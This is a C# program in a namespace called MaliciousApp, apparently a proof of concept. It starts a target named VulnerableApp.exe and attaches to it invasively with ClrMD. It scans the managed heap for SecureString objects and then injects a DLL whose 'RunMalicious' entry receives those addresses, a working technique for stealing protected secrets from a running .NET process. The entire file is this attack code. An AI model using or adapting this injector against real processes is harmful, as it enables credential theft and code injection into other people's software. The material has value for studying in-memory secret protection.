using Microsoft.Diagnostics.Runtime;
using System;
using System.Diagnostics;
using System.Threading;
using System.Linq;
using System.IO;

namespace MaliciousApp
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Launching vulnerable app");
            Process process = Process.Start(@"VulnerableApp.exe");
            Thread.Sleep(2000);

            Console.WriteLine("Getting SecureString addresses");
            string list = GetSecureStringListAsString(process);

            Console.WriteLine("Injecting malicious DLL");
            string dllPath = Path.GetFullPath("DllToInject.dll");
            Injector.NetDLLIntoNetProcess(process.Id, dllPath, "RunMalicious", list);
            

            Console.ReadKey();
            
        }

        static string GetSecureStringListAsString(Process process)
        {
            string list = "";

            using (var dataTarget = DataTarget.AttachToProcess(process.Id, 10000, AttachFlag.Invasive))
            {
                var clrVersion = dataTarget.ClrVersions.First();
                var runtime = clrVersion.CreateRuntime();
                var appDomain = runtime.AppDomains.First();



                var heap = runtime.Heap;
                if (heap.CanWalkHeap)
                {
                    foreach (var ptr in heap.EnumerateObjectAddresses())
                    {
                        var type = heap.GetObjectType(ptr);

                        if (type.Name == "System.Security.SecureString")
                        {
                            var obj = heap.GetObject(ptr);

                            Console.WriteLine("Found SecureString at address " + obj.Address);
                            list += obj.Address + ";";
                        }
                    }
                }
            }

            return list;

        }
    }
}
